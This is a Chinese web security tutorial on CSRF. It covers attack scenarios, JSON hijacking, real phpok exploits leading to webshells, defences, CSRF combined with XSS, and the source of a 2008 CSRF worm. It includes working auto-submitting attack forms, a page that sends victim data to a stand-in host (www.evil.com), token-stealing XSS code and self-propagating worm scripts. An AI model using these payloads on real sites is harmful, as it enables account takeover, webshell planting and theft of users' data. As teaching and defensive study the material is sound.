# 邪恶的CSRF

0x00 什么是CSRF
============

* * *

CSRF全称Cross Site Request Forgery，即跨站点请求伪造。我们知道，攻击时常常伴随着各种各样的请求，而攻击的发生也是由各种请求造成的。

从前面这个名字里我们可以关注到两个点：一个是“跨站点”，另一个是“伪造”。前者说明了CSRF攻击发生时所伴随的请求的来源，后者说明了该请求的产生方式。所谓伪造即该请求并不是用户本身的意愿，而是由攻击者构造，由受害者被动发出的。

CSRF的攻击过程大致如图：

![](http://drops.javaweb.org/uploads/images/5248f250476c46b9b1df91bd44dfc06c70db5373.jpg)

0x01 CSRF攻击存在的道理
================

* * *

一种攻击方式之所以能够存在，必然是因为它能够达到某种特定的目的。比如：通过程序中的缓冲区溢出漏洞，我们可以尝试控制程序的流程，使其执行任意代码；通过网站上的SQL注入漏洞，我们可以读取数据库中的敏感信息，进而获取Webshell甚至获取服务器的控制权等等。而CSRF攻击能够达到的目的是使受害者发出由攻击者伪造的请求，那么这有什么作用呢？

显然，这种攻击的威力和受害者的身份有着密切的联系。说到这儿我们可以思考一下，攻击者之所以要伪造请求由受害者发出，不正是想利用受害者的身份去达到一些目的吗？换句话说，受害者身上有达到这个目的所必需的条件，

而这些必需的条件在Web应用中便是各种各样的认证信息，攻击者就是利用这些认证信息来实现其各种各样的目的。

下面我们先看几个攻击场景。

0x02 场景举例
=========

* * *

（1）场景一：

在一个bbs社区里，用户在发言的时候会发出一个这样的GET请求：

```
GET /talk.php?msg=hello HTTP/1.1
Host: www.bbs.com
…
Cookie: PHPSESSID=ee2cb583e0b94bad4782ea
(空一行)

```

这是用户发言内容为“hello”时发出的请求，当然，用户在请求的同时带上了该域下的cookie，于是攻击者构造了下面的csrf.html页面：

```
<html>
    <img src=http://www.bbs.com/talk.php?msg=goodbye />
</html>

```

可以看到，攻击者在自己的页面中构造了一个发言的GET请求，然后把这个页面放在自己的服务器上，链接为`http://www.evil.com/csrf.html`。之后攻击者通过某种方式诱骗受害者访问该链接，如果受害者此时处于登录状态，就会带上bbs.com域下含有自己认证信息的cookie访问`http://www.bbs.com/talk.php?msg=goodbye`,结果就是受害者按照攻击者的意愿提交了一份内容为“goodbye”的发言。

有人说这有什么大不了的，好，我们再看看另一个场景下的CSRF攻击。

（2）场景二：

在一个CMS系统的后台，发出下面的POST请求可以执行添加管理员的操作：

```
POST /manage.php?act=add HTTP/1.1
Host: www.cms.com
…
Cookie: PHPSESSID=ee2cb583e0b94bad4782ea;
is_admin=234mn9guqgpi3434f9r3msd8dkekwel
(空一行)
uname=test&pword=test

```

在这里，攻击者构造了的csrf2.html页面如下：

```
<html>
    <form action="/manage.php?act=add" method="post">
        <input type="text" name="uname" value="evil" />
        <input type="password" name="pword" value="123456" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
</html>

```

该页面的链接为`http://www.evil.com/csrf2.html`，攻击者诱骗已经登录后台的网站管理员访问该链接（比如通过给管理员留言等方式）会发生什么呢？当然是网站管理员根据攻击者伪造的请求添加了一个用户名为evil的管理员用户。

通过这些场景我们可以看到，CSRF攻击会根据场景的不同而危害迥异。小到诱使用户留言，大到垂直越权进行操作。这些攻击的请求都是跨域发出,并且至关重要的一点，都是在受害者的身份得到认证以后发生的。另外，我们在第一个场景中攻击时并没有使用JavaScrpit，这说明CSRF攻击并不依赖于JavaScript。

0x03 CSRF攻击方式
=============

* * *

（1）HTML CSRF攻击：

即利用HTML元素发出GET请求（带src属性的HTML标签都可以跨域发起GET请求），如：

```
<link href="…">
<img src="…">
<iframe src="…">
<meta http-equiv="refresh" content="0; url=…">
<script src="…">
<video src="…">
<audio src="…">
<a href="…">
<table background="…">
…

```

若要构造POST请求，则必须用表单提交的方式。另外，这些标签也可以用JavaScript动态生成，如：

```
<script>
    new Image().src = 'http://www.goal.com/…';
</script>

```

（2）JSON HiJacking攻击：

为了了解这种攻击方式，我们先看一下Web开发中一种常用的跨域获取数据的方式：JSONP。

先说一下JSON吧，JSON是一种数据格式，主要由字典（键值对）和列表两种存在形式，并且这两种形式也可以互相嵌套，非常多的应用于数据传输的过程中。由于JSON的可读性强，并且很适合JavaScript这样的语言处理，已经取代XML格式成为主流。

JSONP（JSON with Padding）是一个非官方的协议，是Web前端的JavaScript跨域获取数据的一种方式。我们知道，JavaScript在读写数据时受到同源策略的限制，不可以读写其他域的数据，于是大家想出了这样一种办法：

前端html代码：

```
<meta content="text/html; charset=utf-8" http-equiv="Content-Type" /> 
<script type="text/javascript"> 
    function jsonpCallback(result) { 
        alert(result.a); 
        alert(result.b);
        alert(result.c); 
        for(var i in result) { 
            alert(i+":"+result[i]);//循环输出a:1,b:2,etc. 
        } 
    } 
</script> 
<script type="text/javascript" src="http://crossdomain.com/services.php?callback=jsonpCallback"></script>

```

后端的php代码：

```
<?php 
//服务端返回JSON数据 
$arr=array('a'=>1,'b'=>2,'c'=>3,'d'=>4,'e'=>5); 
$result=json_encode($arr); 
//echo $_GET['callback'].'("Hello,World!")'; 
//echo $_GET['callback']."($result)";
//动态执行回调函数 
$callback=$_GET['callback']; 
echo $callback."($result)";
?>

```

可以看到，前端先是定义了jsonpCallback函数来处理后端返回的JSON数据，然后利用script标签的src属性跨域获取数据（前面说到带src属性的html标签都可以跨域），并且把刚才定义的回调函数的名称传递给了后端，于是后端构造出“jsonpCallback({“a”:1, “b”:2, “c”:3, “d”:4, “e”:5})”的函数调用过程返回到前端执行，达到了跨域获取数据的目的。

一句话描述JSONP：前端定义函数却在后端完成调用然后回到前端执行！

明白了JSONP的调用过程之后，我们可以想象这样的场景：

当用户通过身份认证之后，前端会通过JSONP的方式从服务端获取该用户的隐私数据，然后在前端进行一些处理，如个性化显示等等。这个JSONP的调用接口如果没有做相应的防护，就容易受到JSON HiJacking的攻击。

就以上面讲JSONP的情景为例，攻击者可以构造以下html页面：

```
<html>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type" /> 
<script type="text/javascript"> 
    function hijack(result) { 
        var data = '';
        for(var i in result) {
            data += i + ':' + result[i];
        }
        new Image().src = "http://www.evil.com/JSONHiJacking.php?data=" + escape(data);//把数据发送到攻击者服务器上
    } 
</script> 
<script type="text/javascript" src="http://crossdomain.com/services.php?callback=hijack"></script>
</html>

```

可以看到，攻击者在页面中构造了自己的回调函数，把获取的数据都发送到了自己的服务器上。如果受害者在已经经过身份认证的情况下访问了攻击者构造的页面，其隐私将暴露无疑。

我们用以下几张图来总结一下JSON HiJacking的攻击过程：

![](http://drops.javaweb.org/uploads/images/c67d7e70a48a704e1a958943eb9db0c7c192e727.jpg)

![](http://drops.javaweb.org/uploads/images/286b0b5392565d3b6810b0208c4ef4a6a6c9bf34.jpg)

![](http://drops.javaweb.org/uploads/images/b91d8f1a99285a50dafea6fc85211df68fc8ea69.jpg)

![](http://drops.javaweb.org/uploads/images/2c0c8863e9707edb74a27a949aaa2618b494074a.jpg)

（图片来源：[http://haacked.com/archive/2009/06/25/json-hijacking.aspx/](http://haacked.com/archive/2009/06/25/json-hijacking.aspx/)）

0x04 CSRF的危害
============

* * *

前面说了CSRF的基本概念，列举了几个CSRF的攻击场景，讲述了几种CSRF的攻击方法，现在我们来简单总结一下CSRF攻击可能造成的危害。

CSRF能做的事情大概如下：

1）篡改目标网站上的用户数据；  
2）盗取用户隐私数据；  
3）作为其他攻击向量的辅助攻击手法；  
4）传播CSRF蠕虫。

其中前两点我们在之前的例子中已经做了比较详细的说明，不再赘述。第三点即将其他攻击方法与CSRF进行结合进行攻击，接下来我们以实际的漏洞实例来说明CSRF的第三个危害。

另外，CSRF蠕虫就是利用之前讲述的各种攻击方法，并且在攻击代码里添加了形成蠕虫传播条件的攻击向量，这一点会在本文的最后介绍。

0x05 基于CSRF攻击实例
===============

我们来看一下phpok的两个CSRF漏洞如何进行最大化的利用。这两个漏洞均来自乌云：

1.  [phpok csrf添加管理员+后台getshell](http://www.wooyun.org/bugs/wooyun-2010-091886)
2.  [phpok csrf成功getshell(二)](http://www.wooyun.org/bugs/wooyun-2010-091875)

（1）版本4.2.100：

在phpok该版本的后台提交如下POST请求可以添加管理员：

```
POST /phpok/admin.php?c=admin&f=save HTTP/1.1
Host: www.goal.com
…
Cookie: …
（空一行）
id=…&accont=…&pass=…&status=…&if_system=…

```

攻击者可以构造如下页面：

```
<html>
    <div style="display:none">
        <form action="http://localhost/phpok/admin.php?c=admin&f=save" id="poc" name="poc" method="post">
            <input type="hidden" name="id" value=""/>
            <input type="hidden" name="account" value=""/>
            <input type="hidden" name="pass" value=""/>
            <input type="hidden" name="email" value=""/>
            <input type="hidden" name="status" value=""/>
            <input type="hidden" name="if_system" value=""/>
            <input type="submit" name="up" value="submit"/>
        </form>
        <script>
            var t = document.poc;
            t.account.value="wooyun";
            t.pass.value="123456";
            t.status.value="1";
            t.if_system.value="1";
            document.poc.submit();
        </script>
    </div>
</html>

```

攻击发生之前，如图：

![](http://drops.javaweb.org/uploads/images/e78d4040a3c25d8678dd8a122d19e8c700da3a56.jpg)

管理员在登录的情况下访问攻击者的页面之后，如图：

![](http://drops.javaweb.org/uploads/images/f7e4d3bf96b5d91697c6c53322ddf5354763dab2.jpg)

可以看到，成功添加了一名管理员。

攻击到这里就结束了吗？并没有！攻击者利用CSRF漏洞成功进入了后台，他还要想办法GetShell！

在后台风格管理-创建模板文件的地方添加一个模板，通过抓包改包的方式绕过前端对文件类型的判断，如图：

![](http://drops.javaweb.org/uploads/images/5d04cf24bbe82b5e6b647f4952146926402ffe36.jpg)

把`GET /phpok/admin.php?c=tpl&f=create&id=1&folder=/&type=file&title=wooyun.html`

改为`GET /phpok/admin.php?c=tpl&f=create&id=1&folder=/&type=file&title=wooyun.php`

可以看到成功添加了.php文件：

![](http://drops.javaweb.org/uploads/images/1df9e5ca6de5f8f9c1d16f1b93fe9346b73fdb2b.jpg)

然后在编辑文件内容为一句话木马即可：

![](http://drops.javaweb.org/uploads/images/1462b1c936acedc8b4e5e7ff101efbabd15975af.jpg)

在此次攻击中，攻击者最后利用后台添加模板处的限制不严格拿到了Webshell，但在此之前使攻击者得以进入后台的却是CSRF漏洞，由此可以看到CSRF在这次攻击中的重要性。

（2）还是4.2.100...

刚才我们是通过CSRF先进入后台，然后利用后台的其他漏洞GetShell,这次我们直接在前台利用CSRF漏洞去GetShell怎么样？

phpok的前台可以上传.zip文件，我们把木马文件test.php压缩为test.zip；

注册一个账号，进入修改资料页面；

选择一个正常的图片，截获数据，如图：

![](http://drops.javaweb.org/uploads/images/5d0c82d2480052d6f37d87a0ccbb612a4b089508.jpg)

![](http://drops.javaweb.org/uploads/images/afeb77b210d30607d9d72271d5004112e2666152.jpg)

然后修改数据，如图：

![](http://drops.javaweb.org/uploads/images/dc96bb7d1c6dcc99d1b95984cb582b50e391f360.jpg)

成功上传.zip文件，记录下文件id号，这里是739。

在后台的程序升级-ZIP离线包升级中的升级操作存在CSRF漏洞，演示如图：

![](http://drops.javaweb.org/uploads/images/f0b4418a2ba3cf0360464a779daa08dbeb783c8b.jpg)

于是攻击者可以构造如下页面：

```
<html>
    <form action="http://localhost//phpok/admin.php?c=update&f=unzip" id="poc" name="poc" method="post">
        <input type="hidden" name="zipfile" value=""/>
        <input type="hidden" name="file" value=""/>
        <input type="submit" name="up" value="submit"/>
    </form>
    <script>
        var t = document.poc;
        t.zipfile.value="739";
        t.file.value="739";
        document.poc.submit();
    </script>
</html>

```

管理员登录后台后访问攻击者的页面，如图：

![](http://drops.javaweb.org/uploads/images/c030eaee4ab20eb46b8179790410da48270cd936.jpg)

![](http://drops.javaweb.org/uploads/images/08925336d21d904dd11721e53b5b1f84dd09eb22.jpg)

可以看到我们的木马文件已经上传到服务器上了。

这次攻击，我们根本没有进入后台，而是利用一个CSRF漏洞直接就拿到了Webshell，由此可以看出CSRF在某些场景下的威力之大，根本不亚于SQL注入和文件上传这样的漏洞。

0x05 CSRF的防御
============

* * *

前面我们了解了这么多有关CSRF攻击的东西，目的是为了明白如何防御CSRF攻击（真的是这样吗？...）。

要防御CSRF攻击，我们就要牢牢抓住CSRF攻击的几个特点。

首先是“跨域”，我们发现CSRF攻击的请求都是跨域的，针对这一特点，我们可以在服务端对HTTP请求头部的Referer字段进行检查。一般情况下，用户提交的都是站内的请求，其Referer中的来源地址应该是站内的地址。至关重要的一点是，前端的JavaScript无法修改Referer字段，这也是这种防御方法成立的条件。

不过需要说明的是，有的时候请求并不需要跨域，比如我们后面讲到的结合XSS进行攻击的时候，有的时候甚至没有Referer字段…，这些也是使用这种防御方法的弊病所在。

第二点是“伪造”，这也是CSRF攻击的核心点，即伪造的请求。我们来想一下，攻击者为什么能够伪造请求呢？换句话说，攻击者能够伪造请求的条件是什么呢？纵观之前我们伪造的所有请求，无一例外，请求中所有参数的值都是我们可以预测的，如果出现了攻击者无法预测的参数值，那么将无法伪造请求，CSRF攻击也不会发生。基于这一点，我们有了如下两种防御方法：

1.  添加验证码；
    
2.  使用一次性token。
    

先看看第一种。验证码的核心作用是区分人和机器，而CSRF攻击中的请求是在受害者上当的情况下由浏览器自动发出的，属于机器发出的请求，攻击者无法预知验证码的值，所以使用验证码可以很好地防御CSRF攻击，但毫无疑问，验证码会一定程度地影响用户体验，所以我们要在安全和用户体验之间找到一个平衡点。

再看看第二种方法。所谓token是一段字母数字随机值，我们可以把它理解为一个服务端帮我们填好的验证码！每当我们访问该页面时，服务端会根据时间戳、用户ID、随机串等因子生成一个随机的token值并传回到前端的表单中，当我们提交表单时，token会作为一个参数提交到服务端进行验证。在这个请求过程中，token的值也是攻击者无法预知的，而且由于同源策略的限制，攻击者也无法使用JavaScript获取其他域的token值，所以这种方法可以成功防御CSRF攻击，也是现在用的最多的防御方式。

但是，需要注意的一点是，token的生成一定要随机，即不能被攻击者预测到，否则这种防御将形同虚设。另外，token如果作为GET请求的参数在url中显示的话，很容易在Referer中泄露。还有更重要的一点：如果在同域下存在XSS漏洞，那么基于token的CSRF防御将很容易被击破，我们后面再说。

除了“跨域”和“伪造”两点，我们还可以注意到CSRF在攻击时间上的特点：CSRF攻击都是在受害者已经完成身份认证之后发生的，这是由CSRF攻击的目的所决定的。基于这一点，我们还可以想出一些缓解CSRF攻击的方法（注意是缓解），比如缩短Session的有效时间等等，可能一定程度上会降低CSRF攻击的成功率。

总结一下上面的防御方法如下：

1.  验证Referer；
    
2.  使用验证码；
    
3.  使用CSRF token；
    
4.  限制Session生命周期。
    

其中第四种属于缓解类方法，就不多说了。我们看一下其他三种方法都分别存在什么弊病。

Referer最大弊病：有些请求不带Referer；

验证码最大弊病：影响用户体验；

CSRF token最大弊病：随机性不够好或通过各种方式泄露，此外，在大型的服务中需要一台token生成及校验的专用服务器，需要更改所有表单添加的字段，有时效性的问题。

那么有没有其它的办法能够有效地防御CSRF攻击呢？xeye团队的monyer提出了下面这样的方法：

原理与token差不多：当表单提交时，用JavaScript在本域添加一个临时的Cookie字段，并将过期时间设为1秒之后在提交，服务端校验有这个字段即放行，没有则认为是CSRF攻击。

前面提到，token之所以可以防御CSRF，是因为攻击者无法使用JavaScript获取外域页面中的token值，必须要遵守同源策略；而临时Cookie的原理是：Cookie只能在父域和子域之间设置，也遵守同源策略，攻击者无法设置该Cookie。

下面看一个简单的demo，前端`http://127.0.0.1:8888/test.html`：

```
<html>
    <script>
        function doit() {
            var expires = new Date((new Date()).getTime()+1000);
            document.cookie = "xeye=xeye; expires=" + expires.toGMTString();
        }
    </script>
    <form action="http://127.0.0.1:8888/test.php" name="f" id="f" onsubmit="doit();" target="if1">
        <input type="button" value="normal submit" onclick="f.submit();">
        <input type="button" value="with token" onclick="doit();f.submit();">
        <input type="submit" value="hook submit">
    </form>
    <iframe src="about:blank" name="if1" id="if1"></iframe>
</html>

```

服务端`http://127.0.0.1:8888/test.php`:

```
<?php
echo "<div>Cookies</div>";
var_dump($_COOKIE);
?>

```

前端test.html页面中有三个按钮：第一个是正常的表单提交；第二个是添加临时Cookie后提交表单；第三个是以hook submit事件来添加临时Cookie并提交。

我们来演示一下效果，test.html页面如图：

![](http://drops.javaweb.org/uploads/images/7b49fc9cd2da9481e33892252db3424be4fd741c.jpg)

normal submit之后：

![](http://drops.javaweb.org/uploads/images/2fa45f97185281de342ab97c8aeb5dc3aa7b3bc8.jpg)

看到只有xampp设置的一个Cookie，试一下with token按钮：

![](http://drops.javaweb.org/uploads/images/fd2d599315243960a4ba1d9619c13251456c795f.jpg)

看到我们提交的Cookie中多出了一个名为“xeye”的Cookie，再试一下hook submit：

![](http://drops.javaweb.org/uploads/images/b80e2ed6c9dcfa658db36273b480589fc2f85e71.jpg)

效果和第二个相同。

通过上面的演示，我们可以看到设置临时Cookie的效果。

不过这种方式只适用于单域名的站点，或者安全需求不需要“当子域发生XSS隔离父域”。因为子域是可以操作父域的Cookie的（通过设置当前域为父域的方式），所以这种方法的缺点也比较明显：这种方法无法防御由于其他子域产生的XSS所进行的表单伪造提交（注意：使用token可能也会有这样的问题，马上说到）。但如果对于单域站点而言，这种防御方法的安全性可能会略大于token。

对于这种防御方式的几个小疑问：

1.  网络不流畅，有延迟会不会导致Cookie失效？这个显然是不会的，因为服务端Cookie是在提交请求的header中获得的。延时在服务端，不在客户端，而1秒钟足可以完成整个表单提交过程。
    
2.  Cookie的生成依赖于JavaScript，相当于这个token是明文的？这是肯定的，不管采用多少种加密，只要在客户端，就会被破解，不过不管怎样，CSRF无法在有用户状态的情况下添加这个临时Cookie字段（同源策略）。虽然通过服务端可以，但是无法将当前用户的状态也带过去（即攻击者尝试在自己的中转服务器上添加临时Cookie，但是这种做法背离CSRF攻击的目的了，因为受害者的Cookie（认证信息）不会发到攻击者的中转服务器上啊…顺便说一句，Referer也是同样的道理）。
    
3.  如果由于某种网络问题无法获取Cookie呢？那么保存用户状态的Cookie当然也无法获取了，用户只能再重新提交表单才可以，这就与CSRF无关了。
    

由于这种防御策略还没有被大规模使用，所以无法确定其是否真实有效。不过如果有效的话，这大概是一种最简单的、对代码改动最小，且对服务器压力也最小的防御CSRF的方法。

在攻击方法中我们详细讲解了JSON HiJacking，那么针对这种特定的CSRF攻击方法，我们有没有什么特定的防御方法呢？

当然有了，这里介绍两种：

1）在返回的脚本开始部分加入“while(1);”:

当攻击者通过JSON HiJacking的方式获取到返回的JSON数据时，其攻击代码会陷入死循环中，无法将敏感信息发送到自己的服务器上，这样就防止了信息泄露；而正常的客户端代码可以正确地处理返回的JSON数据，它可以先将“while(1);”去掉再正常处理。

这样做相比较与其他方式CSRF的方法有一个突出的好处，即不依赖浏览器的边界安全策略，而是在代码级别引入保护机制。

Google的部分服务就采取了这种防御方法，具体内容可以参考下面的链接：

[http://stackoverflow.com/questions/2669690/why-does-google-prepend-while1-to-their-json-responses](http://stackoverflow.com/questions/2669690/why-does-google-prepend-while1-to-their-json-responses)

2) 使用POST表单提交的方式获取JSON数据：

当前端可以使用XMLHttpRequest获取JSON数据时，当然也可以使用POST表单的方式完成这项任务，这样的话攻击者就无法使用script标签来获取JSON数据（因为src属性发出的是GET请求）。

纵观这些CSRF的防御方法，无一不是针对CSRF攻击成立的条件进行破坏，这也是“未知攻，焉知防”道理的体现。我们在对自己的网站进行防御的时候，要根据自己的业务场景，选择一个最合适的防御方案。

0x06 结合XSS的CSRF攻击
=================

* * *

前面我们说到了基于CSRF的攻击，讲的是在一整套攻击中使用CSRF来达到最终目的或某个中间目的。而这里我们要说的是：如何利用CSRF的“黄金搭档”——XSS来辅助我们完成一次CSRF攻击。

为什么说XSS是CSRF的“黄金搭档”呢？因为当XSS存在时，我们往往可以利用它来突破目标站点对CSRF攻击的防护；还有一些情况，比如我们可以找到一些“SELF-XSS”，即只能跨自己，那么如果可以CSRF的话，就不仅仅能跨自己了。我们标题里说的“结合”就是指这两种方式。

下面我们举例说明：

1) 利用XSS窃取token之后发起CSRF攻击

以前面0x05中的第一个例子为例，我们的目标是进入后台。

加入添加管理员的POST请求如下（加入了token）：

```
POST /phpok/admin.php?c=admin&f=save HTTP/1.1
Host: www.goal.com
…
Cookie: …
（空一行）
id=…&accont=…&pass=…&status=…&if_system=…&accont=…&token=…

```

那么我们就不能直接构造出攻击页面了，因为token的值我们无法预测，一般情况下我们也无法得到token的值，但我们假设，在给管理员留言的地方存在XSS漏洞，但是管理员的Cookie加了HttpOnly属性，我们无法通过XSS直接获取管理员的Cookie，那该怎么办呢？我们可以把这两个漏洞结合起来利用。

我们可以利用XSS在管理员的浏览器中执行下面的JavaScript代码：

```
<script>
    var frameObj = document.createElement("iframe");
    frameObj.setAttribute("id", "add");
    document.body.appendChild(frameObj);
    document.getElementById("add").src = "admin.php?c=admin&f=save";
    var token = document.getElementById("add").contentWindow.document.getElementById("token").value; //从iframe中的页面中获取token值
    var xmlhttp;
    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp = new XMLHttpRequest();
    } else { // code for IE6, IE5
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.open("POST", "admin.php?c=admin&f=save", true);
    xmlhttp.send("id = & accont = wooyun&pass=123456&status=1&if_system=1&token=" + token); //带上token提交添加管理员的请求
</script>

```

代码很好理解，首先我们通过iframe的方式嵌入含有token的页面，因为同域，所以我们可以对页面中的DOM进行读写操作，所以顺利取得token；然后我们利用AJAX的方式带上token提交添加管理员的请求，我们依靠XSS成功突破了页面对CSRF攻击的防护。

2） 结合CSRF发起XSS攻击

（实例来源：[百度某站可结合CSRF及XSS劫持账号](http://www.wooyun.org/bugs/wooyun-2010-033537)）

在百度词典-我的词典处，有将生词添加进生词本的功能，在备注的时候没有进行过滤，可以直接插入JavaScript代码。

但这显然是一个“SELF-XSS”,只能跨自己，有什么用呢？

再看看，页面似乎没有对CSRF做防护，那么我们是不是可以利用CSRF来触发这个XSS，让别人跨自己呢？

构造POST请求页面如下：

```
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
</head>
<body>
    <form id="baidu" name="baidu" action="http://dict.baidu.com/wordlist.php" method="POST">
        <input type="text" name="req" value="add" />
        <input type="text" name="word" value="Wooyun" />
        <input type="text" name="explain" value="<script src=http://xsserme></script>" />
        <input type="submit" value="submit" />
    </form>
    <script>
        document.baidu.submit();
    </script>
</body>
</html>

```

诱惑受害者访问该页面，效果如图：

![](http://drops.javaweb.org/uploads/images/0977e88899fcde7bcec073f3810d6d6a35a3f023.jpg)

看看生词本：

![](http://drops.javaweb.org/uploads/images/2a432c192a7da7d9a0f3446b291358e5d9db60b5.jpg)

已经成功添加了一个新单词“Wooyun”，到我们的XSS平台上看看备注中的JavaScript代码有没有执行：

![](http://drops.javaweb.org/uploads/images/a4c0aad7da33002c223afd8ab7b85a5209bd60aa.jpg)

![](http://drops.javaweb.org/uploads/images/c8c722f38000cb370bc01ef7ae767e68e2145e79.jpg)

代码成功执行！

由此可以看到，如果能够将XSS攻击和CSRF攻击结合起来，会产生1+1>2的效果。

0x07 CSRF蠕虫
===========

* * *

说说蠕虫。

蠕虫有两大特征：

1） 传播性；

2） 恶意行为。

蠕虫的恶意行为是由其传播性引起的，也就是说，凡是传播可以做的事，蠕虫基本上都可以做，而且还可以做些和特定蠕虫有关的事，比如我们要说的CSRF蠕虫就可以大批量地获取用户的隐私信息（CSRF的危害之一嘛）。

所以，我们主要研究CSRF蠕虫的传播性。

CSRF蠕虫的传播性如何实现呢？在前面我们提到过，CSRF蠕虫就是在CSRF的攻击页面中加入了蠕虫传播的攻击向量。这听上去感觉很容易，但实施起来恐怕还要多考虑一些东西。

仔细想想，在一个SNS网站上传播CSRF蠕虫有一个不得不考虑的问题：蠕虫面对的是不同的用户，而不仅仅是某一个受害者。那对于不同的用户，其对应的请求（CSRF核心：伪造的请求嘛）会不会有些地方不一样呢？

没错，在之前的CSRF攻击中，我们的攻击目标是某一个特定的个体。当我们可以预测其请求的所有参数之后，我们就可以发起攻击。但是在SNS网站上传播CSRF蠕虫就不是这么简单。即使每个用户的所有请求参数都可以预测，但是对于不同的用户，其对应的请求参数是不一样的，我们无法像前面的攻击那样构造攻击页面，必须想办法获取这些标识不同用户的数据。

方法一：利用服务端脚本获取

在这里，我们构造的攻击页面不是一个简单的.html文件了，而是一个服务端脚本，如php、asp等等。

受害者的标识信息，如用户id等，经常出现在url中，这样我们就可以利用服务端脚本来获取请求的Referer中的用户id，以此为基础构造出html+js的攻击页面，在攻击向量中添加我们服务端脚本的链接，以此造成蠕虫传播的效果。

方法二：利用JSON HiJacking技术获取

JSON HiJacking的攻击方法前面已经讲得很详细了，如果网站上提供了这样的获取数据的接口，那么利用这种技术获取用户的隐私信息是一个不错的方法。

综上所述，如果一个SNS网站上存在CSRF漏洞，并且我们有办法获取到用户的标识信息，那么就满足了CSRF蠕虫传播的条件，这个网站就是可蠕虫的。

下面看一个CSRF蠕虫实例：

这是2008年发起的一次针对译言网（`www.yeeyan.org`）的CSRF蠕虫攻击，攻击者的链接为`http://www.evilsite.com/yeeyan.asp`，服务端脚本yeeyan.asp内容如下：

```
<%
'auther: Xlaile
'data: 2008-09-21
'this is the CSRF Worm of www.yeeyan.com        

r = Request.ServerVariables("HTTP_REFERER")
'获取用户的来源地址，如：http://www.yeeyan.com/space/show/hving        

If InStr(r, "http://www.yeeyan.com/space/show") > 0 Then
    'referer判断，因为攻击对象为yeeyan个人空间留言板，就是这样的地址        

    Function regx(patrn, str)
        Dim regEx
        Dim Match
        Dim Matches
        Set regEx        = New RegExp
        regEx.Pattern    = patrn
        regEx.IgnoreCace = True
        regEx.Global     = True
        Set Matches      = regEx.Execute(str)    

        For Each Match in Matches
            RetStr          = RetStr & Match.Value & " | "
        Next    

        regx             = RetStr
    End Function    

    Function bytes2BSTR(vIn)
        Dim strReturn
        Dim i1
        Dim ThisCharCode
        Dim NextCharCode
        strReturn      = ""    

        For i1 = 1 To LenB(vIn)
            ThisCharCode  = AscB(MidB(vIn,i1,1))    

            If ThisCharCode <  & H80 Then
                strReturn    = strReturn & Chr(ThisCharCode)
            Else
                NextCharCode = AscB(MidB(vIn,i1 + 1,1))
                strReturn    = strReturn & Chr(CLng(ThisCharCode) * & H100 + CInt(NextCharCode))
                i1           = i1 + 1
            End If    

        Next    

        bytes2BSTR = strReturn
        End
        id         = Mid(r,34) '获取用户标识ID，如:hving
        furl       = "http://www.yeeyan.com/space/friends/" + id '用户好友列表链接是这样的
        Set http   = Server.CreateObject("Microsoft.XMLHTTP") '使用这个控件
        http.Open "GET",furl,False '同步，GET请求furl链接
        http.Send '发送请求
        ftext  = http.ResponseText '返回请求结果，为furl链接对应的HTML内容
        fstr   = regx("show/(\d+)?"">[^1-9a-zA-Z]+<img",ftext)
        '正则获取被攻击用户的所有好友的ID值，CSRF留言时需要这个值
        farray = Split(fstr , " | ")
        '下面几句就是对获取到的ID值进行简单处理，然后扔进f(999)数组中
        Dim f(999)    

        For i = 0 To UBound(farry) - 1
            f(i)    = Mid(farray(i),6,Len(farray(i)) - 16)
        Next    

        Set http = Nothing    

        s        = ""    

        For i = 0 To UBound(farray) - 1
            s       = s + "<iframe width=0 height=0 src='yeeyan_iframe.asp?id=" & f(i) & "'></iframe>" '接着循环遍历好友列表，使用iframe发起CSRF攻击
        Next    

        Response.Write(s)    

        ' Set http=Server.CreateObject("Microsoft.XMLHTTP")        

        ' http.open "POST","http://www.yeeyan.com/groups/newTopic/",False        

        ' c = "hello"        

        cc = "data[Post][content]=" & c & "&" & "ymsgee=" & f(0) & "&" & "ymsgee_username=" & f(0)    

        ' http.send cc        

    End If     
%>

```

其中yeeyan_iframe.asp代码如下：

```
<%
'author: Xlaile
'date: 2008-09-21
'this is the CSRF Worm of www.yeeyan.com
'id = Request("id")    

s = "<form method='post' action='http://www.yeeyan.com/groups/newTopic/' onsubmit='return false'>"    

s = s+"<input type='hidden' value='The delicious Tools for yeeyan translation:http://127.0.0.1/yeeyan.asp' name='data[Post][content]'/>    

s = s+"<input type='hidden' value=" + id + " name='ymsgee'/>"    

s = s+"<input type='hidden' value=" + id + " name='ymsgee_username'/>    

s = s+"</form>"    

s = s+"<script>document.forms[0].submit();</script>"    

Response.write(s)    

%>

```

这段代码只具备传播性，属于没有恶意的实验代码。从yeeyan.asp的代码中我们可以看到，攻击者就是依靠Referer字段得到了译言用户的id值。而yeeyan_iframe.asp是构造表单的代码，用来具体发起CSRF攻击。当用户登录译言网，并且点击攻击者的链接后，这个CSRF蠕虫就会开始传播。

0x08 还有什么东西？
============

* * *

写到这里，我所了解的有关CSRF攻击与防御的内容就差不多写完了。在写前面内容的时候，我一直在有意回避一个东西，那就是在现在的Web前端仍然占有重要地位的Flash，以及ActionScript脚本。

这里就简单补充一下，这些东西和CSRF攻击有什么联系。

首先，我们必须先介绍一个文件——crossdomain.xml，次文件通常在网站的根目录下存在，比如`http://www.qq.com`网站上的crossdomain.xml文件内容如下：

![](http://drops.javaweb.org/uploads/images/f44d3a356f07a1a62ffb696a71728fa19ca214d0.jpg)

`https://www.baidu.com`网站上的crossdomain.xml文件内容如下：

![](http://drops.javaweb.org/uploads/images/852cd12ec16d4f98d437a40a935a596f074595dd.jpg)

该配置文件中的“allow-access-from domain”用来配置哪些域的Flash请求可以访问本域的资源。如果该项值为“*”，则表示任何与的Flash都可以访问，这是非常危险的。当存在这样的配置时，攻击者可以利用ActionScript脚本轻松突破同源策略的限制，如下：

```
import flash.net. *
//请求隐私数据所在页面    

var loader = new URLLoader(new URLRequest(http: //www.foo.com/private);    

loader.addEventListener(Event.COMPLETE, function() { //当请求完成后    
    loader.data; //获取到隐私数据    
    //更多操作    
});

Loader.load(); //发起请求

```

当通过身份认证的受害者被诱惑访问含有以上脚本的页面时，其隐私将可能被攻击者盗走。

